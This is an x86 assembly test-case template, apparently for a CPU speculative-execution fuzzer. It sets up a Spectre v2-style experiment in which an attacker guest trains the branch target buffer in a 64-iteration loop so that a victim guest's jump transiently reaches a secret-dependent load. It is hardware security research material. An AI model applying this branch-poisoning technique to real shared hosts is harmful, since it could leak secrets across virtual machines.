.intel_syntax noprefix

# ============================================================================
# clean injection + strong training (tight loop). no random_instructions.
#
# same alignment skeleton as template-v2v-inject2.asm (benign lfence fall-through
# blocks sls; disclosure sits at a btb-mispredict-only offset past the safe block),
# but the attacker now trains the same jmp pc 64x in a loop instead of once:
#
#     .bb_vmjmp:  jmp rax           ; -> vm_disc (arch); trains btb[this pc]=vm_disc
#     vm_disc:    dec r8; jnz .bb_vmjmp   ; loop back to the jmp (64 iterations)
#
# so the btb entry is firmly installed and can (hypothesis) overpower the victim's
# own accumulated "safe" history that a single training jmp could not.
#
# the victim carries a matching `mov r8,64` pad so its jmp stays byte-aligned with
# the attacker's training jmp.  r8 is the loop counter — prime/probe never touch it.
# run with config-v2v-pp.yaml (p+p, no shared memory).
#   >0 => single-jmp training was the missing piece = genuine injection.
#   0  => still frozen (training strength was not the blocker).
# ============================================================================

# ----------------------------- host orchestrator ----------------------------
.section .data.main
.function_main_0:
.macro.set_h2g_target.vm.function_vm_0: nop qword ptr [rax + 0xff]
.macro.set_g2h_target.main.function_main_1: nop qword ptr [rax + 0xff]
.macro.switch_h2g.vm.0: nop qword ptr [rax + 0xff]

.function_main_1:
.macro.landing_g2h.main_1: nop qword ptr [rax + 0xff]
.macro.set_h2g_target.vm.function_vm_train: nop qword ptr [rax + 0xff]
.macro.set_g2h_target.main.function_main_2: nop qword ptr [rax + 0xff]
.macro.switch_h2g.vm.1: nop qword ptr [rax + 0xff]

.function_main_2:
.macro.landing_g2h.main_2: nop qword ptr [rax + 0xff]
.macro.set_h2g_target.vmvictim.function_vmvictim_1: nop qword ptr [rax + 0xff]
.macro.set_g2h_target.main.function_main_3: nop qword ptr [rax + 0xff]
xor rax, rax  # noremove
xor rbx, rbx  # noremove
xor rcx, rcx  # noremove
xor rdx, rdx  # noremove
xor rsi, rsi  # noremove
xor rdi, rdi  # noremove
.macro.switch_h2g.vmvictim.2: nop qword ptr [rax + 0xff]

.function_main_3:
.macro.landing_g2h.main_3: nop qword ptr [rax + 0xff]
.macro.fault_handler: nop qword ptr [rax + 0xff]
.patch_placeholder_fault_handler:
.macro.set_h2g_target.vm.function_vm_measure: nop qword ptr [rax + 0xff]
.macro.set_g2h_target.main.function_main_4: nop qword ptr [rax + 0xff]
.macro.switch_h2g.vm.3: nop qword ptr [rax + 0xff]

.function_main_4:
.macro.landing_g2h.main_4: nop qword ptr [rax + 0xff]
nop


# ----------------------------- attacker (guest user, observer) --------------
.section .data.vm
.function_vm_train:
.macro.landing_h2g.vm_1: nop qword ptr [rax + 0xff]
xor rax, rax  # noremove
mov rax, qword ptr [r14 + 0x2000] # noremove
mov rbx, qword ptr [r14 + 0x2008] # noremove
mov rcx, qword ptr [r14 + 0x2010] # noremove
mov rdx, qword ptr [r14 + 0x2018] # noremove
mov rsi, qword ptr [r14 + 0x2020] # noremove
mov rdi, qword ptr [r14 + 0x2028] # noremove
mfence # noremove
lea rax, qword ptr [rip + .function_vm_disc]  # noremove   (trained target = disc, past safe)
mov r8, 64  # noremove                                      (loop counter)
# (no terminator here -> falls through to the jmp bb)

.bb_vmjmp:
jmp rax  # noremove                     # training jmp; arch -> vm_disc; trains btb[this pc]

.function_vm_safe:
lfence  # noremove   (jmp fall-through = benign dead end; blocks sls. dead architecturally.)
.macro.switch_g2h.main.vm_safe: nop qword ptr [rax + 0xff]
lfence

.function_vm_disc:
dec r8  # noremove
jnz .bb_vmjmp  # noremove               # loop back to the training jmp (64x total)

.bb_vmexit:
lfence  # noremove
.macro.switch_g2h.main.vm_1: nop qword ptr [rax + 0xff]
lfence

.function_vm_0:
.macro.landing_h2g.vm_0: nop qword ptr [rax + 0xff]
.macro.measurement_start.vm_0: nop qword ptr [rax + 0xff]
.macro.switch_g2h.main.vm_0: nop qword ptr [rax + 0xff]
lfence

.function_vm_measure:
.macro.landing_h2g.vm_2: nop qword ptr [rax + 0xff]
xor rax, rax  # noremove
xor rbx, rbx  # noremove
xor rcx, rcx  # noremove
xor rdx, rdx  # noremove
xor rsi, rsi  # noremove
xor rdi, rdi  # noremove
.macro.measurement_end.vm_2: nop qword ptr [rax + 0xff]
.macro.switch_g2h.main.2: nop qword ptr [rax + 0xff]
lfence


# ----------------------------- victim (guest user) --------------------------
.section .data.vmvictim
.function_vmvictim_1:
.macro.landing_h2g.vmvictim_1: nop qword ptr [rax + 0xff]
xor rax, rax  # noremove
mov rax, qword ptr [r14 + 0x2000] # noremove   (secret input in rax)
mov rbx, qword ptr [r14 + 0x2008] # noremove
mov rcx, qword ptr [r14 + 0x2010] # noremove
mov rdx, qword ptr [r14 + 0x2018] # noremove
mov rsi, qword ptr [r14 + 0x2020] # noremove
mov rdi, qword ptr [r14 + 0x2028] # noremove
mfence # noremove
lea rbx, qword ptr [rip + .function_vmvictim_safe]  # noremove   (arch target = benign safe)
mov r8, 64  # noremove                                            (pad to align the jmp; dead here)
jmp rbx  # noremove                     # arch/sls -> safe;  btb mispredict -> disclosure

.function_vmvictim_safe:
lfence  # noremove   (jmp fall-through = benign dead end; blocks sls)
.macro.switch_g2h.main.vmvictim_1: nop qword ptr [rax + 0xff]
lfence

.function_vmvictim_disclosure:
and rax, 0b111111000000  # noremove
mov rcx, qword ptr [r14 + rax]   # noremove   (transient: secret-dependent load)
lfence  # noremove
.macro.switch_g2h.main.vmvictim_2: nop qword ptr [rax + 0xff]
lfence


# ----------------------------- exit -----------------------------------------
.section .data.main
.test_case_exit:nop
